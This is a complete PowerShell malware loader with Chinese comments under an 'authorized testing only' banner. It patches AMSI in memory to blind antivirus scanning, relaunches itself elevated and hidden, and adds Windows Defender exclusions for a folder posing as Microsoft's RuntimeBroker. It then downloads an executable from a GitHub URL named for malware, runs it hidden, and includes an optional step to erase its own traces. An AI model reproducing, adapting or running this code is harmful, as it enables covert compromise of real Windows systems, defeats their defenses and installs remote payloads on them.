# ======================================================================
# 仅供授权安全测试使用！未经许可用于他人系统属违法行为。
# ======================================================================

# 1. 先进的 AMSI 绕过（内存补丁方式）
try {
    # 通过反射获取 AmsiUtils 并修改 amsiContext 结构
    $a = [Ref].Assembly.GetType('System.Management.Automation.AmsiUtils')
    $f = $a.GetField('amsiContext', 'NonPublic,Static')
    $c = $f.GetValue($null)
    # 将 amsiContext 中的扫描状态置为安全（0x0000）
    [System.Runtime.InteropServices.Marshal]::WriteInt32($c, 0)
} catch {
    # 如果以上失败，尝试备用方法（修改 amsiInitFailed）
    try {
        $t = [Ref].Assembly.GetType('System.Management.Automation.AmsiUtils')
        $f = $t.GetField('amsiInitFailed', 'NonPublic,Static')
        $f.SetValue($null, $true)
    } catch {}
}

# 2. 自我提权（以管理员身份运行）
if (-not ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole(544)) {
    $scriptPath = Join-Path $env:TEMP 'update.ps1'
    Copy-Item $PSCommandPath $scriptPath -Force
    Start-Process powershell "-NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -File `"$scriptPath`"" -Verb RunAs
    exit
}

# 3. 配置变量
$workDir = Join-Path $env:LOCALAPPDATA 'Microsoft\WindowsApps\RuntimeBroker'
$exeName = 'RuntimeBroker.exe'
$exePath = Join-Path $workDir $exeName
$payloadUrl = 'https://github.com/woohoomalware/WeAreDanger/raw/refs/heads/main/letsgo.exe'

# 4. 添加 Defender 排除项（防止实时扫描干扰）
try {
    Add-MpPreference -ExclusionPath $workDir -ErrorAction SilentlyContinue
    Add-MpPreference -ExclusionProcess $exeName -ErrorAction SilentlyContinue
} catch {}

# 5. 创建工作目录
New-Item $workDir -ItemType Directory -Force -ErrorAction SilentlyContinue | Out-Null

# 6. 下载 payload（优先使用 Invoke-WebRequest，失败则用 BITS）
try {
    Write-Host "[+] 正在从 $payloadUrl 下载..."
    Invoke-WebRequest -Uri $payloadUrl -OutFile $exePath -TimeoutSec 30 -ErrorAction Stop
    Write-Host "[+] 下载成功（Invoke-WebRequest）"
} catch {
    Write-Host "[!] Invoke-WebRequest 失败，尝试 BITS..."
    Start-BitsTransfer -Source $payloadUrl -Destination $exePath -Priority High -ErrorAction SilentlyContinue
}

# 7. 验证下载并执行
if (Test-Path $exePath) {
    Write-Host "[+] 文件已就绪，启动执行..."
    Start-Sleep -Seconds 2
    Start-Process -FilePath $exePath -WindowStyle Hidden -WorkingDirectory $workDir
    Write-Host "[+] 已启动进程：$exeName"
} else {
    Write-Error "[-] 下载失败，文件不存在！"
    exit 1
}

# 8. 清理痕迹（可选）
# Remove-Item $PSCommandPath -Force -ErrorAction SilentlyContinue
